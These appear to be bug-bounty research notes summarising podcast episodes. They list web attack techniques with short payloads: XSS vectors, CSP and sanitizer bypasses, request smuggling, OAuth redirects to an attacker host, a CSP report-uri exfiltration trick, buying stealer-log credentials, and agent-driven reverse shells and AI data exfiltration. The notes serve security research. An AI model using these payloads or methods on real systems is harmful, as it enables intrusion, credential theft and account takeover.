- regex flag sloppiness (multi-line/case-insensitive missing).
- non-recursive `replace("../","")` defeated by `....//`.
- JS `replace` only first match unless `/g` or `replaceAll`.
- abstract function call (`$this->{$user_var}($_REQUEST)`) — silent eval (PHP, reflection in others).
- type confusion: array-where-string, object-where-array — DOS via panicked page escalation.
- URL-decoded path bypass: backend accepts whole path URL-encoded → bypass front-end path filter.

## Ep 55 — WordPress Plugins (Ram Gall, Wordfence)
- `is_admin()` checks request-area path, NOT user role.
- `add_action('admin_init', cb)` and `admin_post` handlers fire for unauthenticated requests via `/wp-admin/admin-ajax.php` / `/wp-admin/admin-post.php`. `wp_ajax_<action>` + `wp_ajax_nopriv_<action>`.
- WP nonce = CSRF token NOT access control — nonce rendered to low-priv page = access bypass.
- `$pagenow` from `PHP_SELF` — historical nginx `profile.php%00admin.php` → `$pagenow == 'admin.php'` while serving profile.php → leak admin nonces.
- `add_filter('update_user_metadata', cb, 10, 4)` — low-priv profile edit triggers plugin code.
- `?rest_route=/` / `/wp-json/` lists ALL REST routes unauth.
- REST route `permission_callback` default true.
- WP REST parses raw body for ALL methods including GET → desync `$_GET` vs `WP_REST_Request->get_json_params()`.
- Elementor 10M+ subscriber+ RCE — `admin_init` nonce-only-checked + arbitrary zip unzip to webroot.

## Ep 56 — Mayonnaise / Data Science
- Frequency-analyze subdomain word-fragments split on `.`/`-` → ingredient groups → recipe enumeration. Cross-ref API-group word (`payments`) between hosts.

## Ep 57 — H1-305
- `connect-src *.googleapis.com` allows `storage.googleapis.com` — JSON API endpoint echoes Origin + credentials → reach raw object via `?alt=media`.
- HTML5 `<image>` outside SVG rewrites to `<img>` (spec literally "Don't ask") — filter bypass for `img`/`IMG`-only blocks.

## Ep 58 — Yusuf Sammouda / Client-side ATO
- postMessage async origin-swap race: response posts to currently-cached `targetOrigin`; flip during in-flight request. Facebook Candy-Crush → Instagram OAuth-token leak. See [[postmessage-async-origin-swap]].
- postMessage megabyte-flood as delay — block event loop to widen race vs server-side lock.
- JSON.parse vs substring asymmetry — CPU race winner.
- Regex-bomb postMessage race — oversized hash slows validation, parallel re-trigger 100K times client-side.
- Scroll-to-text-fragment xs-leak: Chrome `#:~:text=word` scrolls iframe AND bleeds to parent → 1-bit oracle. Force `text/plain` for char-level, UTF-16 re-encode for word-boundaries-per-char. See [[scroll-to-text-fragment]].
- Math.random prediction via iframe `name` cross-origin read — 5 leaks → reconstruct V8 xorshift128+ seed. Donut research. See [[math-random-prediction]].
- postMessage `targetOrigin` as options object `{targetOrigin:'https://x'}` smuggles past string-check.
- Transferable objects (ArrayBuffer/MessagePort/ReadableStream/ImageBitmap/RTCDataChannel) keep prototype, smuggle properties past `typeof === 'string'`.
- MessagePort leak — one-shot transferable, post-handshake bypasses origin checks.
- Iframe as `window.opener` via specific nav tricks.
- Email-as-only-trust-anchor in third-party OAuth → email-confirmation bypass = ATO.

## Ep 59 — Gadget Hunting
Gadget catalog (chainable not standalone):
- HTML injection → CSS injection (Gareth Hayes), DOM-clobbering, dangling-markup (close `<script>` mid-state-blob), stored DOS (image-src logout endpoint, login-CSRF wrong account).
- Open-redirect chains (SSRF, OAuth-code path leak, iframe-source mobile webview).
- CSPT + open-redirect → reflected XSS in heavily-sanitized SPA (fetch follows redirect, innerHTML trusts own origin).
- WCD 302 query-leak: cached 302 captures victim's query → revisit without params, server replays 302 with victim's query. Matan Bear.
- LocalStorage poisoning via `window.open` race-redirect.
- SessionStorage poisoning via `var w = window.open(gadget); w.location = 'real_page'`.
- Cookie injection via semicolon → server emits new Set-Cookie header.
- CRLF + XSS same origin → CSP `report-uri=//attacker` exfils secrets.

## Ep 60 — PortSwigger Top 10 2023
- H2 single-packet attack (recap).
- Akamai edge smuggling → cache poisoning → Net-NTLM theft (Office365). ~25% global Akamai initially poisonable; ~75% F5 BIG-IP behind Akamai vulnerable. See [[akamai-edge-smuggling]].
- SMTP smuggling: spec terminator `\r\n.\r\n`; some servers accept `\n.\n`/`\r.\r` → SPF-allowed relay smuggles second message past DKIM/DMARC alignment. See [[smtp-smuggling]].
- PHP filter chain LFI → RCE — chain `php://filter/convert.iconv...` to fabricate arbitrary PHP source for `include`. See [[php-filter-chain-rce]].
- Nginx trim-strip mismatch: Node `\xa0`/`\x09`/`\x0c`; Spring/Flask/PHP each with own set. `GET /admin\xa0 HTTP/1.1` routes by `/admin\xa0` (no nginx rule), backend trims to `/admin`. See [[nginx-trim-strip-mismatch]].
- Nginx header line-folding bypass: `X-Foo: a\r\n\tb` = one header `X-Foo: a b`. AWS WAF doesn't fold, backend does.
- Backend non-slash path prefix: `GET @host/path`, `GET ;param`, `GET *path`, `GET http://x/path HTTP/0.9`.
- Nginx regex `location ~ "[^/]+"` more permissive than `.*` for newline injection.
- Sergey Bobrov 505-probe for request-splitting: append ` HTTP/13.37\r\n`.
- Angular class-attribute `ng-init`: `<div class="ng-init:constructor.constructor('alert(1)')()">` — Masato MS Teams pwn2own where `swift-*` class allowed. See [[ng-init-class-attribute]].
- Electron contextIsolation:false → prototype pollute `Function.prototype.call` from renderer JS.
- Nameless cookie `Set-Cookie: =foo` — parser disagreement bypasses `__Host-`/`__Secure-`.
- Cookie-tossing priority: duplicate more-specific Path overrides HttpOnly value in request.
- Double-submit CSRF bypass via cookie fixation from sibling XSS / `Set-Cookie` injection.
- EPP port 700 XXE: textbook DOCTYPE over plain XML → Sam Curry LFI → SSH key → 20+ TLD root-zone backups.

## Ep 61 — JR0ch17
- Transcript misnamed/duplicated; matches Ep 62 content.

## Ep 62 — Frontend Language Oddities
- `<input type=image src=/ onerror=alert(1)>` fires onerror — WAFs flag `<img>` only. See [[input-type-image-onerror]].
- Form attribute smuggling: `<input form=victimFormId name=foo value=bar>` placed anywhere submits with form. See [[form-attribute-smuggling]].
- Form `target` named iframe hijack: `<form target=frameName>` posts response into same-origin named iframe (matching `window.open(url, name)` of victim).
- Yelp self-XSS → ATO via cookie-bridge + cookie-bombing retrieve path (HackerOne #2089042).
- OkHttp drops `Authorization` on redirects when scheme/host/port differ; custom signing headers pass through. See [[okhttp-redirect-auth-strip]].
- CSS container queries leak idea — char-width + size selectors (dead end due to size-fit disable).
- CSS perspective leak — populate page through victim's authenticated perspective (auto-OG-fetch on link comments) → CSS injection on that page exfils rendered title/image.
- Tools: portswigger/css-exfiltration repo (`steal-reversed-firefox`); Wakaru JS decompiler (webpack + browserify); 0xdevalias chatgpt-source-watch.

## Ep 63 — JHaddix Returns
- Threat-intel cred hunting: stealer-log creds (RedLine) on Telegram/dark-web. Preview samples grep `@target.com`. Stealer cookies bypass 2FA. ~$10/cred. 5/6 recent red-team engagements landed via this.
- Residential proxy recon (Bright Data) for VPS-blacklisted targets — low threads (~15).
- hackrevdns ASN PTR sweep.
- Reverse-nameserver pivot (whoisxmlapi paid) — found 12 unknown FIS apex domains.
- Reverse-DMARC (`dmarc.live`).
- Reverse-CSP (`CSPRecon` CLI).
- Geo-locked targets (regional KYC) = less competition.

## Ep 64 — .NET Remoting / CDN
- .NET Remoting objref leak (CodeWhite/Markus Wulftange): repo `code-white/HttpRemotingObjRefLeak` ships vulnerable app + objref-leak script. CVE March 22 2024; patched Jan 2024 but omitted from advisory. See [[dotnet-remoting-objref]].
- DOMPurify processing-instruction bypass: `<?xml ?>` PI replaced with comment; nested in `<svg>` or custom-element config escapes to HTML → `<img onerror>`. slonser_ blog. See [[dompurify-pi-bypass]].
- Cloudflare `/cdn-cgi/*` recon: `/cdn-cgi/trace`, `/cdn-cgi/image/...`, email-decode auto-replaces `data-cfemail` hex via innerHTML.
- Reverse-proxied CDN paths: `target.com/cdn/file.js` → out-of-scope `cdn.target.com`. Upload → in-scope path → XSS.
- Mobile pre-auth redirect: middleware auto-attaches auth to trusted hosts → redirect to attacker.
- `history.pushState` rewrite URL bar — POC polish.

## Ep 65 — Sam Curry / ZLZ
- License-plate → VIN (DMV-derived API ~1.5¢/call) → OEM portal SQLi (`admin' #` Spyderon) → unlock millions of cars.
- Casino slot replay → mint balance — report to game provider, not casino.

## Ep 66 — CDN-CGI / Louis Vuitton
- OAuth `redirect_uri` userinfo-`@` bypass: `https://attacker.com?@target.com/cb` — `?` terminates userinfo for browser (navigates attacker.com), but allowlist parser sees host after `@`. See [[oauth-userinfo-question-bypass]].
- `googlechrome://navigate?url=...` opens any URL via Chrome app — bypass scheme filters checking http/https only.
- Cloudflare email-hiding script hex-decodes `data-cfemail` everywhere → payload smuggling. Combine with DOMPurify permissive `data-*`.
- BigQuery `httparchive` for every `/cdn-cgi/*` URL (cost trap: `SELECT *` billed $14K once).

## Ep 67 — VDP Debate Pt 2
- Edge-proxy/nginx exact-string-match emergency blocks — uppercase/lowercase flip bypass (Bagipro golden URL).
- Caido lacks hex editor — switch to Burp for protobuf/gRPC.

## Ep 68 — HTMX 0-days with Mathias
- HTMX `hx-trigger`/`hx-on:*` use `eval()` → apps must allow `unsafe-eval` → global CSP-bypass primitive. Disable via `allowEval:false`. See [[htmx-csp-bypass]].
- `HX-Redirect: javascript:...` response header → `window.location.href` no scheme check → XSS via attacker-controlled fetched response.
- `hx-disable` only checks legacy `hx-on=...`, not new `hx-on:event=...` colon syntax → bypass.
- DOMPurify `data-hx-on:click=alert(1)` allows HTMX trigger past sanitizer.
- `hx-trigger` value concatenated into JS template + `eval`'d — `})()};alert(1)//` style injection.
- Cloudflare `cdn-cgi/image/onerror=redirect,...` 307 cross-subdomain (same apex) preserves method+body — C-Surf hijack.
- `HX-Retarget`/`HX-Location` response headers override `hx-target` defeating `hx-disable` placement.
- Masato MS Teams XSS: `<strong class="ng-init:alert(1)">`.

## Ep 69 — Joaxcar / 3-month full-time
- CSP `form-action` NOT covered by `default-src` — missing `form-action` lets attacker form-hijack credential exfil. Google CSP Evaluator does NOT flag this; `cspvalidator.org` does. See [[csp-form-action-gap]].
- `<input form=victimFormId formaction=attacker formtarget=_blank>` (form-attribute primitive) overrides existing form's action+target.
- Rails Hotwire/Turbo Frames = Ruby HTMX equivalent. GitHub uses it. Per-form CSRF tokens path-bound.
- Drag-and-drop payload delivery: user drags "image" from attacker page, JS sets dragdata to payload, drop into target input. Users now conditioned to drag CAPTCHAs.

## Ep 70 — NahamCon / CSP Bypasses
- JSONP callback CSP bypass via `*.googleapis.com`/`accounts.google.com`/`youtube.com` — full function call in `callback=`. See [[jsonp-callback-csp-bypass]].
- No-parens dot-chain: `callback=opener.document.querySelector('#approve').click` — browser invokes as function. WordPress universally has this gadget. See [[jsonp-callback-no-parens]].
- `.gitignore`-derived recon — listed paths often live on server.
- `..;/` past root for hidden admin backend (Justin's $6K crit RCE story).
- Nuclei 3.2 — authenticated scanning + fuzz inside headers/cookies/JSON/XML/form bodies.

## Ep 71 — AI Bias Bounty (Keith Hoodlet)
- Credit-union SSN IDOR on employee portal: client-side `@company.com` validation bypassed via Burp; PUT response on registration echoes full name+address+account for SSN. Iterate 9-digit SSN space.
- AI bias scenario methodology: hold scenario constant, vary protected-class variable, reproduce 10× for 0.064% chance threshold. Common biases: pregnant deselected, older/Anglo-Saxon CEO preferred, Australia preferred over Asian disasters.
- AI bias OIG self-incrimination framing — feed protected-class roster → 20 reportable variants.
- AI bias doctrine citation (USMC "yes, rank" 2022 directive).

## AI bias clip
- Duplicate of ep 71 content.

## Ep 168 — XSSDoctor / Client-side Path Traversal
- React `useParams` uppercase `%2F` decodes to `/`, lowercase `%252f` does NOT — 0-day-class differential. Code at `match-path` line ~118. See [[cspt-react-useparams]].
- `useParams` double-URL-decode (Vue/Angular auto-decode too). Next `await params` server-side decodes → secondary-context PT.
- Splat-route `/files/*` = louder CSPT signal than `/files/:id`.
- Blind SCPT detection: `/settings/<valid>%2F..%2F<valid>` vs `/settings/<garbage>` — diff 200/500.
- CSPT on desktop apps via websocket — generalizes to mobile/IoT/SDKs.
- Fetch-hijack via relative-path injection: `//attacker`, `/\\attacker`, `/\t/attacker` resolve absolute.
- `fetch()` silently strips `\t \n \r` from URL → WAF bypass `%2F%2E%09%2E%5C`.
- Triple URL-encode for React CSPT (when server decodes once + useParams decodes once).
- Axios JSONP CSPT → JSONP callback exec → client RCE on some versions.
- Web-worker injection via host-portion from query param.
- OAuth username:password `@` injection — spray PortSwigger URL-validation table.
- Sinks: Vue/Nuxt `v-html`; Angular `bypassSecurityTrustHtml`; Svelte `{@html}`; React `dangerouslySetInnerHTML`; Ember `urlForFindRecord` string-interp.
- Tools: Bus Factor's "Gecko" extension flags URL-bar reflection into outgoing API calls.

## Ep 169 — OAuth / MCP / PKCE
- oauth2-proxy regex-anchor bypass (CVE-2025-54576): skip-auth regex matched against full URI (path+query) — append `?param=<regex-match>` to protected path. See [[oauth2-proxy-regex-anchor]].
- JWT unknown-algorithm fail-open (CVE-2026-23993, Pentester Labs/Harbor lang): not just `none`, ANY unknown alg (`bandana`, `ZZZ`) bypasses verification. See [[jwt-unknown-alg-fail-open]].
- OAuth refresh token after deactivation — common implementation gap.
- RFC 8693 token-exchange scope-downgrade not enforced in most impls → confused-deputy across multi-agent. Auth0 Token Vault.
- Client manifest URI (CIMD) static → auth servers cache → cache-deception primitives apply.
- Already-covered: pkce-downgrade, mcp-cimd-ssrf, mutable-claim-ato.

## Ep 170 — Claude Code + Tmux / Websockets
- `tmux send-keys` integration: open netcat rev shell in pane, Claude drives via send-keys — no escaping issues.
- MCP server OAuth grant scope expansion — AI performs actions outside user-consented scope.
- AI exfil via yes/no binary encoding — slips past full-string sink defenses.
- HTML injection in AI chat contexts → higher impact than web equivalent.
- AI feature regression: Claude Code regression jobs against past payloads on Google AI VRP.
- Webhook HMAC/SHA-signed — have Claude recompute, then probe hash-extension/bit-flip/replay.
- SDK wrapper traversal: `userId="../organizations"` through SDK call → cross-resource access.

## Ep 171 — Path-scoped Cookie / Protobuf XSS
- Already-covered: path-scoped-cookie-bypass, post-based-protobuf-xss.
- Age-leak → DOB pivot: poll daily, increment day = exact birthdate.
- Clickjack ctrl-click for cross-iframe top-nav.
- `keydown` is also user gesture (not just `click`) for `window.open` popup-blocker bypass.
- Conditional-UI on modifier-key trains victim to ctrl-click cleanly.
- Lira SVG clickjacking — responsive overlay buttons visually depress.
- Raw-protobuf XSS detail: pad final string field length +2 bytes so form-submission `\r\n` absorbed without desync.
- WordPress Azure-AD-SSO plugin: JWT id_token middle segment unchecked → log in as any user → admin → RCE.

## Ep 172 — Source Code Review Meta Analysis
- C# `Path.Combine(base, userInput)` returns userInput when absolute — devs assume confinement, doesn't.
- Validate-then-transform anti-pattern: any transform between sanitize + sink re-introduces bug.
- Alternative source bypass: legacy v1/v2/SMS/websocket/bulk-import — sanitize-at-source means each ingress must apply.
- Non-global replace + bad regex: missing `/g`, missing `^`/`$`, unescaped `.`, backslash in `[]`.
- Dynamic function invocation sink — `$func($arg)`, `getattr` chains, `eval`, `Function`, XSLT, Rhino, Jexl.
- Inconsistent auth source: per-route middleware not globally applied — truthy/typing differences across endpoints.
- Cross-tech parser differential: frontend `JSON.parse` OK forwarded as raw bytes, backend Python `json.loads` differs.
- Dependency confusion on low-star deps (~200★) — high zero-day yield.
- Boring-route discipline: avatar/profile-image routes (Grafana SSRF on `/avatars/` → Gravatar → AWS metadata).
- Fiverr environment spinup: $200 for someone to install closed-source enterprise software.
- Ghidra + Claude via MCP for RE.
- Force AI to maintain CLAUDE.md gadget registry per target.
- Tools: SL Cyber `hyoketsu` identifies reused OSS jars; HackerOne H1 Brain MCP — past reports → Claude skills (privacy caveat).
- Already-covered: source-code-review wiki page.

## Ep 173 — Is Bug Bounty Dead?
- Hacking-Proof per-report submission fee refunded on validity — $5 fee = 80% slop drop.
- Programs requiring screenshot/video at submission as anti-slop + proof-of-existence.
- Claude Code per-machine training-data opt-out — account-level opt-out insufficient on cluster/VPS.
- Google Android/Chrome VRP (May 2026) — low/mid bonuses dropped; full-chain zero-click Pixel Titan-M2 persistence raised to $1.5M.
- Intigriti × PortSwigger: 400 valid rep/quarter = free 6-month Burp Pro.

---

## Tool / target intel summary
- Caido: per-project ~3s switch vs Burp ~2min; scope `*word*` keyword; workflow plugin system; no hex editor (Burp for protobuf); single-packet-attack not yet impl as of Feb 2024; WebSocket repeater being added (per ep 170 era).
- Yusuf Sammouda: Facebook/Meta postMessage class breaker; multiple million-dollar chains.
- Yelp: $1.5–4K mediums, $7–10K crits; cross-locality cookie-bridge architecture.
- GitHub: Hotwire/Turbo; per-form CSRF path-bound; script-src single domain (no nonces, no inline).
- Meta: top crit ~$300K; loyalty tier +$20K bonuses; auth grants for deep SSRF/blind-XSS chains.
- Yahoo Paranoids: NahamCon $50K bonus pool; bonuses for critical-thinker / returning-hacker / scope-tag.
- DoD CDAO AI Bias Bounty (BugCrowd 2024): US-domiciled only.
- Thermo Fisher: $225B mcap, VDP only.
- Intigriti × PortSwigger rep promo.

## Open research seeds
- CSS container-queries char-width leak (dead-end on container size-fit).
- Axios JSONP CSPT → RCE version range mapping.
- Custom-element DOMPurify config + PI bypass variants.
- HTMX CSP-bypass surface expansion.
- Web worker injection via host-portion CSPT.
- SDK wrapper traversal patterns (Stripe/Twilio/etc).
